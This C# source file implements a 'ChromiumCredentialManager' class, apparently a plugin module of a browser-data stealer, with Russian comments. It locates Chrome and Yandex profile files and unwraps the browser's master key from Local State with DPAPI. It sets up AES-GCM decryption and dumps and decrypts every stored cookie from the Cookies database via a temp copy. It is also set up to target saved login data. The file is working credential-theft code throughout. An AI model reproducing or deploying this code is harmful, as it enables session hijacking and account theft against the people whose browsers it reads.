using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Diagnostics;
using System.Security.Cryptography;
using CS_SQLite3;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Data;
using Plugin;


namespace Plugin
{
    class ChromiumCredentialManager
    {
        internal string userDataPath;
        internal string userChromiumHistoryPath;
        internal string userChromiumBookmarksPath;
        internal string userChromiumCookiesPath;
        internal string userChromiumLoginDataPath;
        internal string userYandexpath;
        internal string userHistorypath;
        internal string userLocalStatePath;
        internal string chromiumBasePath;
        internal bool useTmpFile = false;
        internal byte[] aesKey = null;
        internal BCrypt.SafeAlgorithmHandle hAlg = null;
        internal const int AES_BLOCK_SIZE = 16;
        internal BCrypt.SafeKeyHandle hKey = null;

        internal string[] filterDomains = null;

        internal static byte[] DPAPI_HEADER = UTF8Encoding.UTF8.GetBytes("DPAPI");
        internal static byte[] DPAPI_CHROME_UNKV10 = UTF8Encoding.UTF8.GetBytes("v10");
        public ChromiumCredentialManager(string basePath, string[] domains = null)
        {
            if (Environment.GetEnvironmentVariable("USERNAME").Contains("SYSTEM"))
                throw new Exception("Cannot decrypt Chromium credentials from a SYSTEM level context.");
            if (domains != null && domains.Length > 0)
                filterDomains = domains;

            string localAppData = Environment.GetEnvironmentVariable("LOCALAPPDATA");
            hKey = null;
            hAlg = null;
            chromiumBasePath = basePath;
            if (basePath.Contains("Yandex"))
                userChromiumLoginDataPath = chromiumBasePath + "\\Default\\Web Data";
            else
                userChromiumLoginDataPath = chromiumBasePath + "\\Default\\Login Data";
            userChromiumHistoryPath = chromiumBasePath + "\\Default\\History";
            userChromiumBookmarksPath = chromiumBasePath + "\\Default\\Bookmarks";
            userChromiumCookiesPath = chromiumBasePath + "\\Default\\Network\\Cookies";
            userYandexpath = chromiumBasePath + "\\Default\\Web Data";
            // userHistorypath =chromiumBasePath+""

            userLocalStatePath = chromiumBasePath + "Local State";
            if (!Chromium())
                throw new Exception();
            useTmpFile = true;
            //Process[] chromeProcesses = Process.GetProcessesByName("chrome");
            //if (chromeProcesses.Length > 0)
            //{
            //    useTmpFile = true;
            //}
            string key = GetBase64EncryptedKey();
            if (key != "")
            {
                //Console.WriteLine("Normal DPAPI Decryption");
                aesKey = DecryptBase64StateKey(key);
                if (aesKey == null)
                    throw new Exception();
                DPAPIChromiumAlgFromKeyRaw(aesKey, out hAlg, out hKey);
                if (hAlg == null || hKey == null)
                    throw new Exception();
            }
        }



        private HostCookies[] ExtractCookiesFromSQLQuery(DataTable query)
        {
            List<Cookie> cookies = new List<Cookie>();
            List<HostCookies> hostCookies = new List<HostCookies>();
            HostCookies hostInstance = null;
            string lastHostKey = "";
            foreach (DataRow row in query.Rows)
            {
                try
                {
                    if (row == null)
                        continue;
                    if (row["host_key"].GetType() != typeof(System.DBNull) && lastHostKey != (string)row["host_key"])
                    {
                        lastHostKey = (string)row["host_key"];
                        if (hostInstance != null)
                        {
                            hostInstance.Cookies = cookies.ToArray();
                            hostCookies.Add(hostInstance);
                        }
                        hostInstance = new HostCookies();
                        hostInstance.HostName = lastHostKey;
                        cookies = new List<Cookie>();
                    }
                    //дальше лог куки аыаыаы
                    Cookie cookie = new Cookie();
                    cookie.Domain = row["host_key"].ToString();
                    long expDate;
                    Int64.TryParse(row["expires_utc"].ToString(), out expDate);
                    cookie.forDebug = row["expires_utc"].ToString();
                    cookie.ExpirationDate = (int)expDate;
                    //cookie.ExpirationDate = (int)((expDate / 1000000.000000000000000) - 11644473600);
                    cookie.HostOnly = cookie.Domain[0] == '.' ? false : true; // Я не уверен, что это хранится в хранилище файлов cookie и, кажется, всегда ложно.
                    if (row["is_httponly"].ToString() == "1")
                    {
                        cookie.HttpOnly = true;
                    }
                    else
                    {
                        cookie.HttpOnly = false;
                    }
                    cookie.Name = row["name"].ToString();
                    cookie.Path = row["path"].ToString();
                    // cookie.SameSite = "no_restriction"; // Не уверен, что это то же самое, что и firstpartyonly
                    if (row["is_secure"].ToString() == "1")
                    {
                        cookie.Secure = true;
                    }
                    else
                    {
                        cookie.Secure = false;
                    }
                    cookie.Session = row["is_persistent"].ToString() == "0" ? true : false; // Unsure, this seems to be false always
                                                                                            //cookie.StoreId = "0"; // Static
                    cookie.StoreId = null;
                    cookie.SetSameSiteCookie(row["sameSite"].ToString());
                    byte[] cookieValue = Convert.FromBase64String(row["encrypted_value"].ToString());
                    cookieValue = DecryptBlob(cookieValue);
                    if (cookieValue != null)
                        cookie.Value = System.Text.Encoding.UTF8.GetString(cookieValue);
                    else
                        cookie.Value = "";
                    if (cookie != null)
                        cookies.Add(cookie);
                }
                catch { }

            }
            return hostCookies.ToArray();
        }

        private byte[] DecryptBlob(byte[] dwData)
        {
            if (hKey == null && hAlg == null)
                return ProtectedData.Unprotect(dwData, null, DataProtectionScope.CurrentUser);
            byte[] dwDataOut = null;
            // magic decryption happens here
            BCrypt.BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO info;
            int dwDataOutLen;
            //IntPtr pDataOut = IntPtr.Zero;
            IntPtr pData = IntPtr.Zero;
            uint ntStatus;
            byte[] subArrayNoV10;
            int pcbResult = 0;
            unsafe
            {
                if (ByteArrayEquals(dwData, 0, DPAPI_CHROME_UNKV10, 0, 3))
                {
                    subArrayNoV10 = new byte[dwData.Length - DPAPI_CHROME_UNKV10.Length];
                    Array.Copy(dwData, 3, subArrayNoV10, 0, dwData.Length - DPAPI_CHROME_UNKV10.Length);
                    pData = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(byte)) * dwData.Length);
                    //byte[] shiftedEncVal = new byte[dwData.Length - 3];
                    //Array.Copy(dwData, 3, shiftedEncVal, 0, dwData.Length - 3);
                    //IntPtr shiftedEncValPtr = IntPtr.Zero;
                    try
                    {

                        //shiftedEncValPtr = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(byte)) * shiftedEncVal.Length);
                        Marshal.Copy(dwData, 0, pData, dwData.Length);
                        Utils.MiscUtils.BCRYPT_INIT_AUTH_MODE_INFO(out info);
                        info.pbNonce = (byte*)(pData + DPAPI_CHROME_UNKV10.Length);
                        info.cbNonce = 12;
                        info.pbTag = info.pbNonce + dwData.Length - (DPAPI_CHROME_UNKV10.Length + AES_BLOCK_SIZE); // AES_BLOCK_SIZE = 16
                        info.cbTag = AES_BLOCK_SIZE; // AES_BLOCK_SIZE = 16
                        dwDataOutLen = dwData.Length - DPAPI_CHROME_UNKV10.Length - info.cbNonce - info.cbTag;
                        dwDataOut = new byte[dwDataOutLen];

                        fixed (byte* pDataOut = dwDataOut)
                        {
                            ntStatus = BCrypt.BCryptDecrypt(hKey, info.pbNonce + info.cbNonce, dwDataOutLen, (void*)&info, null, 0, pDataOut, dwDataOutLen, out pcbResult, 0);
                        }
                        if (NT_SUCCESS(ntStatus))
                        {
                            //Console.WriteLine("{0} : {1}", dwDataOutLen, pDataOut);
                        }
                    }
                    catch (Exception ex)
                    {

                    }
                    finally
                    {
                        if (pData != null && pData != IntPtr.Zero)
                            Marshal.FreeHGlobal(pData);
                        //if (pDataOut != null && pDataOut != IntPtr.Zero)
                        //    Marshal.FreeHGlobal(pDataOut);
                        //if (pInfo != null && pInfo != IntPtr.Zero)
                        //    Marshal.FreeHGlobal(pDataOut);
                    }
                }
            }
            return dwDataOut;
        }

        // You want cookies? Get them here.
        public HostCookies[] GetCookies()
        {
            string cookiePath = userChromiumCookiesPath;

            if (useTmpFile)
                cookiePath = Utils.FileUtils.CreateTempDuplicateFile(userChromiumCookiesPath);
            SQLiteDatabase database = new SQLiteDatabase(cookiePath);
            string expires_utc_query = "SELECT host_key, name, path, encrypted_value,expires_utc FROM cookies";
            DataTable resultexpQuery = database.ExecuteQuery(expires_utc_query);

            string query = "SELECT * FROM cookies ORDER BY host_key";
            DataTable resultantQuery = database.ExecuteQuery(query);
            database.CloseDatabase();
            HostCookies[] rawCookies = ExtractCookiesFromSQLQuery(resultantQuery);
            if (useTmpFile)
                try
                {
                    File.Delete(cookiePath);
                }
                catch { Console.WriteLine("[X] Failed to delete temp cookie path at {0}", cookiePath); }
            return rawCookies;
        }

        public static string GetUtf888(string sNonUtf8)
        {
            try
            {
                var bData = Encoding.Default.GetBytes(sNonUtf8);
                return Encoding.UTF8.GetString(bData);
            }
            catch
            {
                return sNonUtf8;
            }
        }





        private bool Chromium()
        {
            string[] paths =
            {
                userChromiumHistoryPath,
                userChromiumCookiesPath,
                userChromiumBookmarksPath,
                userChromiumLoginDataPath,
                userLocalStatePath
            };
            foreach (string path in paths)
            {
                if (File.Exists(path))
                    return true;
            }
            return false;
        }

        public static byte[] DecryptBase64StateKey(string base64Key)
        {
            byte[] encryptedKeyBytes = System.Convert.FromBase64String(base64Key);
            if (ByteArrayEquals(DPAPI_HEADER, 0, encryptedKeyBytes, 0, 5))
            {
                //Console.WriteLine("> Key appears to be encrypted using DPAPI");
                byte[] encryptedKey = new byte[encryptedKeyBytes.Length - 5];
                Array.Copy(encryptedKeyBytes, 5, encryptedKey, 0, encryptedKeyBytes.Length - 5);
                byte[] decryptedKey = ProtectedData.Unprotect(encryptedKey, null, DataProtectionScope.CurrentUser);
                return decryptedKey;
            }
            else
            {
                Console.WriteLine("Unknown encoding.");
            }
            return null;
        }

        private static bool ByteArrayEquals(byte[] sourceArray, int sourceIndex, byte[] destArray, int destIndex, int len)
        {
            int j = destIndex;
            for (int i = sourceIndex; i < sourceIndex + len; i++)
            {
                if (sourceArray[i] != destArray[j])
                    return false;
                j++;
            }
            return true;
        }

        public string GetBase64EncryptedKey()
        {
            if (!File.Exists(userLocalStatePath))
                return "";
            string localStateData = File.ReadAllText(userLocalStatePath);
            string searchTerm = "encrypted_key";
            int startIndex = localStateData.IndexOf(searchTerm);
            if (startIndex < 0)
                return "";
            // encrypted_key":"BASE64"
            int keyIndex = startIndex + searchTerm.Length + 3;
            string tempVals = localStateData.Substring(keyIndex);
            int stopIndex = tempVals.IndexOf('"');
            if (stopIndex < 0)
                return "";
            string base64Key = tempVals.Substring(0, stopIndex);
            return base64Key;
        }

        private static bool NT_SUCCESS(uint status)
        {
            return 0 == status;
        }

        //kuhl_m_dpapi_chrome_alg_key_from_raw
        public static bool DPAPIChromiumAlgFromKeyRaw(byte[] key, out BCrypt.SafeAlgorithmHandle hAlg, out BCrypt.SafeKeyHandle hKey)
        {
            bool bRet = false;
            hAlg = null;
            hKey = null;
            uint ntStatus;
            ntStatus = BCrypt.BCryptOpenAlgorithmProvider(out hAlg, "AES", null, 0);
            if (NT_SUCCESS(ntStatus))
            {
                ntStatus = BCrypt.BCryptSetProperty(hAlg, "ChainingMode", "ChainingModeGCM", 0);
                if (NT_SUCCESS(ntStatus))
                {
                    ntStatus = BCrypt.BCryptGenerateSymmetricKey(hAlg, out hKey, null, 0, key, key.Length, 0);
                    if (NT_SUCCESS(ntStatus))
                        bRet = true;
                }
            }
            return bRet;
        }
    }
}
